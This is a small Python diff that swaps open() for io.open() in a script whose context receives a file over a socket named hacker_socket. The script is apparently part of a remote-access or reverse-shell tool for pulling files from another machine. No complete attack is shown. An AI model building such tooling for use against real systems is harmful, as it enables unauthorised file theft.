@@ -1,4 +1,4 @@
-import socket, os
+import socket, os, io
 
 __author__ = "Marcio Castillo"
 __license__ = "MIT"
@@ -49,7 +49,7 @@ if __name__ == "__main__":
                 print("exits ?", exists.decode())
                 if exists.decode().startswith("yes"):
                     filesize = exists.decode().split(":")[1]
-                    with open(file_name, "wb") as f:
+                    with io.open(file_name, "wb") as f:
                         while True:
                             bytes_read = hacker_socket.recv(4096)
                             print("bytes ~>", bytes_read)
